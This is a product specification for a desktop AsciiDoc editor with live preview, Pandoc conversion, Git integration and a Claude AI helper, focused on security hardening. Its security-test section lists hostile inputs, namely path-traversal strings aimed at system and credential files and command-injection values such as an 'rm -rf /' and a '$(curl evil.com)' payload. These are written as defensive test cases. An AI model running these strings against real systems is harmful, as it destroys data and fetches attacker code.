# AsciiDoc Artisan - Specification v1.1

**Version**: 1.1.0
**Date**: 2025-10-23
**Status**: Ready for Implementation

---

## 1. Overview

AsciiDoc Artisan is a desktop application for writing and editing AsciiDoc documents. It's like Microsoft Word, but designed for technical writers who need to see both the source code and the formatted preview at the same time.

**Target Users**: Technical writers, developers, documentation engineers, content creators

**Core Value**: Write AsciiDoc on the left, see the formatted result on the right, with updates in under half a second

---

## 2. Main Features

1. **Split-Screen Editor** - Edit text and see live preview side-by-side
2. **Fast Updates** - Preview refreshes in 500ms or less
3. **File Conversion** - Import Word, Markdown, PDF; export to HTML, PDF, Word
4. **Git Integration** - Commit, push, and pull without leaving the app
5. **AI Assistant** - Generate and improve content with Claude AI
6. **Cross-Platform** - Works on Windows, Mac, and Linux

---

## 3. User Stories

### 3.1 Edit with Live Preview (Priority: CRITICAL)

**User Action**: Writer types AsciiDoc markup in left pane
**System Response**: Right pane shows formatted HTML within 500ms
**Success Criteria**:
- Preview updates in 500ms for documents under 10,000 lines
- Preview updates in 1000ms for documents 10,000-25,000 lines
- No UI freezing during typing
- Works in both light and dark themes

---

### 3.2 Open and Save Files (Priority: CRITICAL)

**User Action**: Open .adoc file via File → Open, edit, save with Ctrl+S
**System Response**: File loads with preview rendered; saves atomically
**Success Criteria**:
- Opens .adoc, .asciidoc, .md, .docx, .pdf files
- Atomic saves prevent data corruption
- Warns before closing unsaved changes
- Shows asterisk (*) in title for unsaved files

---

### 3.3 Convert File Formats (Priority: HIGH)

**User Action**: Open Word/Markdown/PDF file; export to different format
**System Response**: Auto-converts to AsciiDoc; exports via Pandoc
**Success Criteria**:
- Preserves headings, lists, tables, links
- Shows clear error if Pandoc not installed
- Supports import: DOCX, MD, HTML, PDF, LaTeX, RST
- Supports export: HTML, DOCX, PDF, MD

---

### 3.4 Use Git Version Control (Priority: HIGH)

**User Action**: Edit file, select Git → Commit, enter message
**System Response**: Stages and commits file; can push/pull
**Success Criteria**:
- Commit, push, pull work without command line
- Git menu disabled when file not in repository
- Never uses dangerous Git commands (force push, hard reset)
- Timeout after 30 seconds

---

### 3.5 Get AI Help (Priority: HIGH)

**User Action**: Select Claude AI → Generate Content, describe needs
**System Response**: AI creates AsciiDoc content or improves selection
**Success Criteria**:
- Generates content in 15 seconds or less
- All output is valid AsciiDoc
- Can improve selected text
- Shows error if service not running

---

### 3.6 Remember Settings (Priority: MEDIUM)

**User Action**: Close app, reopen later
**System Response**: Restores last file, window size, theme, font size
**Success Criteria**:
- Last file reopens at same scroll position
- Window geometry (size, position) restored
- Theme preference (light/dark) persisted
- Font zoom level maintained

---

## 4. Functional Requirements

### 4.1 Editing and Preview

**FR-001**: Syntax highlighting for AsciiDoc markup
**FR-002**: Preview updates within 350ms after typing stops (debounce)
**FR-003**: Total preview latency: 500ms (small docs), 1000ms (large docs)
**FR-004**: Word wrap and configurable tabs (4 spaces default)
**FR-005**: Find text (Ctrl+F), replace text, go to line (Ctrl+G)
**FR-006**: Scroll synchronization between editor and preview
**FR-007**: Toggle buttons for full-screen editor, preview, or split view
**FR-008**: Progress indicator for renders over 500ms

### 4.2 File Operations

**FR-009**: Open .adoc, .asciidoc files natively
**FR-010**: Import DOCX, MD, HTML, PDF with auto-conversion
**FR-011**: Atomic writes (temp file + rename pattern)
**FR-012**: File size limits: 50MB max, 25,000 lines max, 10,000 chars/line
**FR-013**: Validation before opening: show warnings at 10k, 15k, 20k lines
**FR-014**: Track modification state (asterisk in title)
**FR-015**: "Save As" for new file locations
**FR-016**: Path sanitization to prevent traversal attacks
**FR-017**: Only allow access to Documents, Desktop, and current directory
**FR-018**: Block access to system directories (/etc, C:\Windows\System32)

### 4.3 Format Conversion

**FR-019**: Pandoc integration for all conversions
**FR-020**: Safe subprocess calls with parameterized arguments
**FR-021**: Validate formats against allowlist
**FR-022**: Show progress for slow conversions
**FR-023**: Support cancellation of conversion jobs
**FR-024**: Handle Pandoc errors with clear user messages
**FR-025**: Check Pandoc availability on startup

### 4.4 Git Integration

**FR-026**: Detect if file is in Git repository
**FR-027**: Commit with user-provided message
**FR-028**: Push to remote, pull from remote
**FR-029**: All Git commands use safe parameter lists (no shell=True)
**FR-030**: Validate user input before passing to Git
**FR-031**: Timeout: 30s for commit, 60s for push/pull
**FR-032**: Disable Git menu when file not in repository
**FR-033**: Never store Git credentials

### 4.5 AI Integration (Claude AI)

**FR-034**: Generate AsciiDoc from text description
**FR-035**: Improve selected content
**FR-036**: Convert between Markdown/HTML/AsciiDoc
**FR-037**: Generate document outlines
**FR-038**: Answer AsciiDoc syntax questions
**FR-039**: Check service availability on startup
**FR-040**: Show progress during AI operations
**FR-041**: Support cancellation of AI requests
**FR-042**: Timeout: 30s for generation requests

### 4.6 Security (CRITICAL - v1.1)

**FR-043**: Store API keys in OS keyring (Keychain/Credential Manager/Secret Service)
**FR-044**: Never store API keys in plain text files
**FR-045**: Prompt for API key on first use
**FR-046**: Migrate existing .env files to keyring automatically
**FR-047**: All subprocess calls use parameterized arguments only
**FR-048**: Never use shell=True in subprocess module
**FR-049**: Validate all user inputs before subprocess calls
**FR-050**: Implement input allowlists for command options
**FR-051**: All file paths resolved and validated against base directories
**FR-052**: Detect and block path traversal attempts (../)
**FR-053**: Log all security events to secure log file
**FR-054**: Claude service requires authentication token
**FR-055**: Generate random token on service startup
**FR-056**: Rate limiting: 100 requests per 15 minutes
**FR-057**: Service binds to localhost only
**FR-058**: Never log passwords, API keys, or sensitive data

### 4.7 Performance

**FR-059**: Adaptive debouncing: 350ms (<10k lines), 500ms (10-20k), 750ms (>20k)
**FR-060**: Cancel obsolete preview renders when new input arrives
**FR-061**: Track render job IDs to prevent out-of-order updates
**FR-062**: Memory limit: 1.5GB maximum
**FR-063**: Monitor memory usage and warn when approaching limit
**FR-064**: Graceful degradation: disable syntax highlighting, preview, or undo history
**FR-065**: Support cancellation of all background workers
**FR-066**: Startup time: under 3 seconds
**FR-067**: No UI freezes longer than 100ms

### 4.8 User Interface

**FR-068**: Light and dark themes
**FR-069**: Theme toggle via F5 or Ctrl+D
**FR-070**: WCAG AA contrast compliance
**FR-071**: Resizable splitter between editor and preview
**FR-072**: Font zoom: Ctrl+Plus, Ctrl+Minus, Ctrl+0
**FR-073**: Status bar with file name and status
**FR-074**: High-DPI display support
**FR-075**: Platform-specific keyboard shortcuts (Ctrl/Cmd)

### 4.9 Session Management

**FR-076**: Persist last opened file path
**FR-077**: Save and restore window geometry
**FR-078**: Save theme preference
**FR-079**: Save font zoom level
**FR-080**: Save splitter position
**FR-081**: Platform-appropriate config directories (XDG, AppData, Application Support)
**FR-082**: JSON configuration format

### 4.10 Cross-Platform

**FR-083**: Identical functionality on Linux, macOS, Windows
**FR-084**: Support WSL with WSLg
**FR-085**: Handle platform-specific path conventions
**FR-086**: Adapt keyboard shortcuts to platform conventions

---

## 5. Architecture

### 5.1 Module Structure (MANDATORY)

**No file shall exceed 500 lines**. Application must be organized as:

```
asciidoctor_artisan/
├── app.py                    # Entry point (<200 lines)
├── ui/                       # User interface (<300 lines each)
│   ├── main_window.py
│   ├── editor_widget.py
│   ├── preview_widget.py
│   ├── dialogs.py
│   └── themes.py
├── workers/                  # Background tasks (<200 lines each)
│   ├── base.py               # CancellableWorker base class
│   ├── preview_worker.py
│   ├── git_worker.py
│   └── pandoc_worker.py
├── core/                     # Business logic (<300 lines each)
│   ├── document.py
│   ├── settings.py
│   ├── asciidoc_api.py
│   └── validation.py         # Path sanitization, security checks
├── git/                      # Git operations (<400 lines)
│   └── repository.py
├── conversion/               # Format conversion (<400 lines)
│   └── pandoc.py
└── claude/                   # AI integration (<300 lines)
    └── client.py
```

### 5.2 Design Patterns

- **MVC**: Separate UI, controller logic, and data models
- **Worker Threads**: Offload rendering, Git, Pandoc, AI to background threads
- **Debouncing**: Timer-based preview updates
- **Atomic Writes**: Temp file + rename pattern for saves
- **Singleton**: Claude client, settings manager

---

## 6. Dependencies

### 6.1 Required

**Python**:
- Python 3.11+
- PySide6 ≥ 6.9.0 (Qt GUI framework)
- asciidoc3 (AsciiDoc to HTML)
- keyring ≥ 24.0.0 (secure credential storage)
- cryptography ≥ 41.0.0 (encryption)
- psutil ≥ 5.9.0 (memory monitoring)

**Node.js**:
- Node.js 18+
- express (web server)
- cors (cross-origin support)
- dotenv (environment variables)
- keytar ≥ 7.9.0 (credential storage)
- express-rate-limit ≥ 7.1.0 (rate limiting)
- @anthropic-ai/claude-agent-sdk (Claude AI)

**External**:
- Anthropic API key (for Claude AI)

### 6.2 Optional

- Pandoc 3.1.3+ (document conversion)
- Git (version control)

### 6.3 Development

- pytest (testing framework)
- pytest-qt (GUI testing)
- bandit ≥ 1.7.5 (security linting)
- safety ≥ 2.3.0 (dependency scanning)

---

## 7. Claude AI Setup

### 7.1 Installation

1. Navigate to `claude-integration/`
2. Run `npm install`
3. Start service: `npm start` or `npm run dev`
4. Service runs on `http://localhost:3000`

### 7.2 Configuration

**First Use**: Application prompts for API key and stores in OS keyring

**Migration**: Existing `.env` files automatically migrated to keyring on first launch

**Security**:
- Random token generated on service startup
- Token stored in `.api-token` file (mode 0600)
- Python client reads token for authentication
- All API requests require `X-API-Token` header

---

## 8. Testing Requirements

### 8.1 Security Tests (MANDATORY)

**Path Traversal**:
- Attempt: `../../../etc/passwd`, `C:\Windows\System32\config\SAM`
- Expected: Blocked and logged

**Command Injection**:
- Attempt: Git commit with `"; rm -rf /; echo "` or `$(curl evil.com)`
- Expected: Safely handled with parameterized arguments

**API Key Storage**:
- Set key → restart app → verify retrieved from OS keyring

### 8.2 Performance Tests (MANDATORY)

**Document Sizes** (render times):
- 1,000 lines: <100ms
- 5,000 lines: <200ms
- 10,000 lines: <300ms
- 15,000 lines: <500ms
- 20,000 lines: <750ms
- 25,000 lines: <1000ms

**Memory Usage**:
- 25,000 line document: <1.5GB
- No UI freeze >100ms

### 8.3 Functional Tests (MANDATORY)

**User Stories**: Test all 6 user stories end-to-end

**Platforms**: Test on Windows 10/11, macOS 12+, Ubuntu 22.04+, WSL2

---

## 9. Success Criteria

### 9.1 Performance
- ✓ Startup <3 seconds
- ✓ Preview <500ms (typical docs)
- ✓ Handle 25,000 lines
- ✓ Memory <1.5GB
- ✓ No UI freeze >100ms

### 9.2 Security (NEW v1.1)
- ✓ Zero critical vulnerabilities
- ✓ No plaintext API keys
- ✓ No command injection
- ✓ No path traversal
- ✓ Security logging

### 9.3 User Experience
- 90% of users edit first doc without instructions
- 30% time savings vs other tools
- Zero data loss incidents
- 85% conversion success rate
- Identical behavior across platforms

---

## 10. Out of Scope

- Multi-file project management
- Real-time collaboration
- Cloud synchronization
- Spell checking (use OS tools)
- Custom AsciiDoc extensions
- Advanced Git features (rebase, cherry-pick)
- PDF editing (export only)
- Custom themes beyond light/dark
- Mobile versions
- Offline AI
- Alternative AI providers

---

## 11. Changes from v1.0 to v1.1

### 11.1 Critical Security Fixes
1. API keys → OS keyring (FR-043 to FR-046)
2. Command injection prevented (FR-047 to FR-050)
3. Path traversal blocked (FR-051 to FR-052)
4. Service authentication added (FR-054 to FR-057)

### 11.2 Performance Updates
1. Debounce timing: 250ms → 350ms (realistic)
2. Total latency: 250ms → 500ms (achievable)
3. Document limit: 10k → 25k lines (with testing)
4. Memory limit: 500MB → 1.5GB

### 11.3 Architecture
1. Module structure enforced (<500 lines/file)
2. Worker cancellation added (FR-065)
3. Security logging implemented (FR-053, FR-058)
4. Better error handling

---

## 12. Implementation Plan

### Phase 1: Security (2 weeks)
- Implement OS keyring for API keys
- Fix command injection (Git, Pandoc)
- Update path sanitization
- Add Node.js service authentication
- Write security tests

### Phase 2: Performance (1 week)
- Adaptive debouncing (350-750ms)
- Document size validation
- Worker cancellation
- Performance tests (1k-25k lines)

### Phase 3: Refactoring (3 weeks)
- Split monolithic file into modules
- Create module structure
- Update imports
- Integration testing

### Phase 4: Release (1 week)
- Run all tests (security, performance, functional)
- Cross-platform validation
- Security audit
- Release v1.1.0

**Total: 7 weeks**

---

## 13. Migration Guide

### 13.1 For End Users

1. Update to v1.1
2. First launch: App finds API key in `.env`
3. App moves key to OS keyring
4. App deletes `.env` (with confirmation)
5. Done - everything else works the same

### 13.2 For Developers

1. Install new dependencies:
   - Python: `pip install keyring cryptography psutil bandit`
   - Node.js: `cd claude-integration && npm install keytar express-rate-limit`
2. Follow module structure for new code (<500 lines/file)
3. Use safe subprocess patterns (see FR-047 to FR-050)
4. Run security tests before committing
5. Check security logs for issues

---

## 14. References

- **Security Analysis**: `docs/SECURITY_ANALYSIS_v1.1.md`
- **Change Summary**: `docs/SPEC_CHANGES_SUMMARY_v1.1.md`
- **Data Model**: `.specify/specs/data-model.md`
- **Implementation**: `.specify/specs/implementation-plan.md`
- **Archived v1.0**: `.specify/specs/project-specification-v1.0-ARCHIVED.md`

---

## 15. Document Control

**Version**: 1.1.0
**Previous**: 1.0.0-beta
**Updated**: 2025-10-23
**Reading Level**: 5th grade
**Status**: Ready for Implementation
**Approved By**: Pending
**Next Steps**: Review → Approve → Implement → Test → Release

---

**End of Specification**
